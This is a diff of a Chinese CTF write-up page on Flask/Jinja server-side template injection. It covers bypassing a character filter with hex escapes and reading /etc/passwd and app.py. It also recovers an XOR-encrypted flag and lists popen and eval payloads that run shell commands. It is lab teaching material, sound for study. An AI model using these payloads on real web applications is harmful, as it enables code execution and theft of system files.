-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>{{1|abs}}      管道可以
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>{{dict}} {{lipsum}} {{config}} {{self}}    这些名字没下划线，能直接写
-</span></code></pre></div>
-<p><strong>所以过滤只有三个字符：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>_   下划线
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>'   单引号
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>.   点
-</span></code></pre></div>
-<p><strong>这三个一拦，常规链基本全废：没有 <code>_</code> 就写不出 <code>__class__</code>，没有 <code>.</code> 就不能取属性。</strong></p>
-<h4 id="step-5"><a class="toclink" href="pasecactf2019-flask-ssti/#step-5">Step 5：把写不出来的字符"算"出来</a></h4>
-<p><strong>关键认知：过滤看的是</strong>你打的字面<strong>，而模板引擎会把</strong>转义<strong>还原。</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">"\x5f"   →  _</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="x">"\x2e"   →  .</span>
-</span></code></pre></div>
-<p><strong>验证：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>{{"\x5f\x5f"}}   →  __
-</span></code></pre></div>
-<p><strong>于是 <code>__globals__</code> 可以写成 <code>"\x5f\x5fglobals\x5f\x5f"</code>，原文里一个下划线都没有。</strong></p>
-<h4 id="step-6"><a class="toclink" href="pasecactf2019-flask-ssti/#step-6">Step 6：两个优先级坑</a></h4>
-<p><strong>① <code>|attr()</code> 后面不能直接跟 <code>[...]</code>，要加括号</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>× lipsum|attr("\x5f\x5fglobals\x5f\x5f")["\x5f\x5fname\x5f\x5f"]     → Exception
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>✓ (lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fname\x5f\x5f"]   → jinja2.utils
-</span></code></pre></div>
-<p><strong>② 方法名也要用下标取（因为 <code>.read()</code> 里的点被拦）</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>× ...["open"]("/etc/passwd").read()       → 那个点触发过滤
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>✓ ...["open"]("/etc/passwd")["read"]()    → 正常
-</span></code></pre></div>
-<p><strong>为什么能用下标取方法？</strong>Jinja 的取值逻辑是：先试 <code>obj[键]</code>，失败再 <code>getattr(obj, 键)</code>。文件对象不能下标，于是回退到取属性，正好拿到 <code>read</code> 方法。</p>
-<p><strong>打通之后：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/etc/passwd")["read"]()}}
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>→ root:x:0:0:root:/root:/bin/ash ...
-</span></code></pre></div>
-<h4 id="step-7-flag"><a class="toclink" href="pasecactf2019-flask-ssti/#step-7-flag">Step 7：找到 flag 在哪儿</a></h4>
-<p><strong>先列根目录：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["listdir"]("/")}}
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>→ ['opt','root','media','home','proc','tmp','lib','etc','dev','sys','sbin','srv','var','run','mnt','usr','bin','app']
-</span></code></pre></div>
-<p><strong>根目录没有 flag 文件，但有个 <code>/app</code>——网站根目录。</strong></p>
-<p><strong>读源码（注意 <code>app.py</code> 里的点也要转义成 <code>\x2e</code>）：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/app/app\x2epy")["read"]()}}
-</span></code></pre></div>
-<p><strong>⚠️ <code>listdir</code> 要目录、<code>open</code> 要文件。我一开始给 <code>listdir</code> 传了个 <code>.py</code> 文件，直接 <code>Exception</code>——因为程序把所有异常都吞成了同一个词，看不出原因。</strong></p>
-<h4 id="step-8-flag"><a class="toclink" href="pasecactf2019-flask-ssti/#step-8-flag">Step 8：源码说 flag 已经被加密了</a></h4>
-<p><strong>拿到 <code>/app/app.py</code>，关键几行：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">encode</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">key2</span><span class="p">):</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key2</span><span class="p">[</span><span class="n">x</span><span class="p">]))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)))</span>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"/app/flag"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span>
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="n">flag</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[:</span><span class="mi">42</span><span class="p">]</span>
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="s1">'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3'</span><span class="p">,</span>
-</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>                                  <span class="s1">'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'</span><span class="p">)</span>
-</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="n">flag</span> <span class="o">=</span> <span class="s2">""</span>
-</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
-</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">"/app/flag"</span><span class="p">)</span>
-</span></code></pre></div>
-<p><strong>三件事：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>① flag 被异或加密后存进 app.config['flag']
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>② 变量 flag 清空了
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>③ 原始文件 /app/flag 被删了
-</span></code></pre></div>
-<p><strong>所以拿到命令执行也没用——文件已经没了。这题真正要的是"看懂加密逻辑"。</strong></p>
-<h4 id="step-9"><a class="toclink" href="pasecactf2019-flask-ssti/#step-9">Step 9：取密文</a></h4>
-<p><strong>密文里有不可打印字符（<code>\x08</code>、<code>\x10</code> 这种），直接 <code>{{config["flag"]}}</code> 输出会被 HTML 转义搅乱。</strong></p>
-<p><strong>用 <code>tojson</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>{{config["flag"]|tojson}}
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>→ "\u0008u\u0010Ew\u0013ajdU#7*\u000e\u001c\u000f&lt;\u0006(DK\u001d\r\u0017!8\u0006h\u0002\n@\\pS,\u0026A&lt;\u0017\\IG"
-</span></code></pre></div>
-<p><strong>不可打印字符全变成 <code>\uXXXX</code>，干净地传出来。</strong></p>
-<h4 id="step-10"><a class="toclink" href="pasecactf2019-flask-ssti/#step-10">Step 10：本地解密</a></h4>
-<p><strong>加密是：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key2</span><span class="p">[</span><span class="n">x</span><span class="p">]))</span>
-</span></code></pre></div>
-<p><strong>异或可逆，反过来算就行：</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">密文</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">i</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key倒序</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key2</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>CTF2{bcd6e1da-c4f1-4c73-83f8-f64ea78ed1cf}
-</span></code></pre></div>
-<hr />
-<h3 id="_3"><a class="toclink" href="pasecactf2019-flask-ssti/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>页面点不动 → jQuery 在 Google CDN，挂了
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>  → 看内联 JS 找到接口：POST /，参数 nickname
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>    → {{7*7}} = 49，模板被执行
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>      → {{config}} 过了，说明不是关键词黑名单
-</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>        → 逐个试，发现只拦 _ ' . 三个字符
-</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>          → 转义绕过：\x5f = _，\x2e = .，单引号换双引号
-</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>            → (lipsum|attr("..."))["..."]  括号保优先级
-</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>              → ["open"](路径)["read"]()   方法名也用下标
-</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>                → listdir("/") 找到 /app
-</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>                  → 读 app.py，发现 flag 已加密存 config、原文件被删
-</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>                    → tojson 取出密文（保住不可打印字符）
-</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>                      → 本地异或解密
-</span></code></pre></div>
-<h4 id="_4"><a class="toclink" href="pasecactf2019-flask-ssti/#_4">漏洞原理</a></h4>
-<p><strong>① <code>render_template_string(nicknames[id] % p)</code> —— 用户输入直接当模板</strong></p>
-<p><strong><code>%</code> 只是套一层装饰字符串，<code>p</code> 仍然原样进了模板。装饰不改变"它是代码"这个事实。</strong></p>
-<p><strong>② 字符级过滤 ≠ 安全</strong></p>
-<p><strong>它拦的是 <code>_ ' .</code> 三个字符，而不是"模板注入"这件事本身。而这三个字符</strong>全都可以用转义表示<strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>过滤看的：源码里的字面
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>引擎看的：转义还原后的值
-</span></code></pre></div>
-<p><strong>这个差和"关键词拼接绕过"是同一个原理，只是从"词"下沉到了"字符"。</strong></p>
-<p><strong>③ 拿到 RCE 不等于拿到 flag</strong></p>
-<p><strong>这题把 flag 加密存进 <code>config</code>、删掉原文件。</strong>所以最后一步是<strong>读源码 + 自己实现解密</strong>，不是 <code>cat</code>。**</p>
-<h4 id="_5"><a class="toclink" href="pasecactf2019-flask-ssti/#_5">关键知识点</a></h4>
-<table>
-<thead>
-<tr>
-<th>知识点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>前端 JS 挂掉也能做题</td>
-<td>看内联 JS 找接口，用 curl / python 直接发</td>
-</tr>
-<tr>
-<td>字符级过滤</td>
-<td><code>_</code> <code>'</code> <code>.</code> 三个字符被拦</td>
-</tr>
-<tr>
-<td><code>\x5f</code> / <code>\x2e</code></td>
-<td>字符串转义，绕字符过滤</td>
-</tr>
-<tr>
-<td>转义只对字符串有效</td>
-<td><code>url\x5ffor</code> 不行——名字不能转义，只有字符串能</td>
-</tr>
-<tr>
-<td><code>\|attr()</code> 后加括号</td>
-<td><code>(x\|attr("y"))["z"]</code></td>
-</tr>
-<tr>
-<td>方法名用下标</td>
-<td><code>["read"]()</code>，因为 <code>.read()</code> 的点被拦</td>
-</tr>
-<tr>
-<td><code>listdir</code> vs <code>open</code></td>
-<td>一个要目录，一个要文件；给错就是 <code>Exception</code></td>
-</tr>
-<tr>
-<td><code>\|tojson</code></td>
-<td>保住不可打印字符，把 <code>\x08</code> 变成 <code>\u0008</code></td>
-</tr>
-<tr>
-<td><code>os.remove</code></td>
-<td>原文件删了 → 必须从 config 取密文</td>
-</tr>
-<tr>
-<td>异或可逆</td>
-<td>加密函数反过来写就是解密</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>题目源码（关键部分）</summary>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">encode</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">key2</span><span class="p">):</span>
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">x</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key2</span><span class="p">[</span><span class="n">x</span><span class="p">]))</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)))</span>
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
-</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"/app/flag"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span>
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">flag</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[:</span><span class="mi">42</span><span class="p">]</span>
-</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>
-</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'flag'</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="s1">'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3'</span><span class="p">,</span>
-</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>                                  <span class="s1">'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'</span><span class="p">)</span>
-</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="n">flag</span> <span class="o">=</span> <span class="s2">""</span>
-</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>
-</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">"/app/flag"</span><span class="p">)</span>
-</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>
-</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
-</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
-</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">:</span>
-</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>        <span class="k">try</span><span class="p">:</span>
-</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>            <span class="n">p</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'nickname'</span><span class="p">)</span>
-</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>            <span class="nb">id</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">nicknames</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
-</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>            <span class="k">if</span> <span class="n">p</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
-</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>                <span class="k">if</span> <span class="s1">'.'</span> <span class="ow">in</span> <span class="n">p</span> <span class="ow">or</span> <span class="s1">'_'</span> <span class="ow">in</span> <span class="n">p</span> <span class="ow">or</span> <span class="s1">'</span><span class="se">\'</span><span class="s1">'</span> <span class="ow">in</span> <span class="n">p</span><span class="p">:</span>
-</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>                    <span class="k">return</span> <span class="s1">'Your nickname contains restricted characters!'</span>
-</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">nicknames</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span>
-</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a>        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a>            <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
-</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a>            <span class="k">return</span> <span class="s1">'Exception'</span>
-</span><span id="__span-23-27"><a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a>    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">)</span>
+<summary>两条链的完整 payload（本题实测）</summary>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x"># 路线一 · _wrap_close：globals 里直接有 popen</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">117</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'popen'</span><span class="o">](</span><span class="s1">'cat /flag'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="x"># 路线一 · catch_warnings：走 __builtins__ → __import__</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">169</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eval'</span><span class="o">](</span><span class="s2">"__import__('os').popen('cat /f*').read()"</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="x"># 路线二 · url_for 短路</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="cp">{{</span><span class="o">(</span><span class="nv">url_for.__globals__</span><span class="o">)[</span><span class="s1">'os'</span><span class="o">]</span><span class="nv">.popen</span><span class="o">(</span><span class="s1">'cat /f*'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
 </span></code></pre></div>
 </details>
 <details class="note">
-<summary>解密脚本</summary>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">KEY1</span> <span class="o">=</span> <span class="s2">"GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3"</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">KEY2</span> <span class="o">=</span> <span class="s2">"xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT"</span>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="k">def</span><span class="w"> </span><span class="nf">decode</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
-</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>    <span class="n">k1</span> <span class="o">=</span> <span class="n">KEY1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>    <span class="k">return</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="n">i</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">k1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">KEY2</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">cipher</span><span class="p">))</span>
+<summary>跨环境更稳的写法：按名字找，不记下标</summary>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="s1">'__init__'</span><span class="o">)</span><span class="nv">.__globals__</span><span class="cp">}}</span>
 </span></code></pre></div>
